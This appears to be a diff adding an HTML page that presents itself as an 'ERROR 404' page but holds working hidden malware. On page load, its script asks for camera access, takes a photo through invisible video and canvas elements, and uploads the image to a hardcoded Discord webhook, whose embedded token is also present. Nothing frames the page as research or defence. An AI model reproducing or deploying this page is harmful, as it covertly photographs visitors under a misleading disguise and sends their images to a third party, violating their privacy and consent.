@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ERROR 404</title>
+</head>
+<body>
+    <h1>ERROR 404</h1>
+    <video id="video" width="320" height="240" autoplay style="display: none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1050405453928071299/kb4c5DgdlhIryXqz8K5aZOvO3ySgEUL_J9oDhUSij-ep-ujGNZCqFSHlT0LTqeeP4NzW";
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    setTimeout(takeAndSendPhoto, 100);
+                };
+            } catch (err) {
+                console.error("Ошибка доступа к камере: ", err);
+            }
+        }
+
+        async function takeAndSendPhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageDataUrl = canvas.toDataURL('image/png');
+            video.srcObject.getTracks().forEach(track => track.stop());
+            await sendToDiscord(imageDataUrl);
+        }
+
+        async function sendToDiscord(imageDataUrl) {
+            const blob = await (await fetch(imageDataUrl)).blob();
+            const formData = new FormData();
+            formData.append('file', blob, 'photo.png');
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
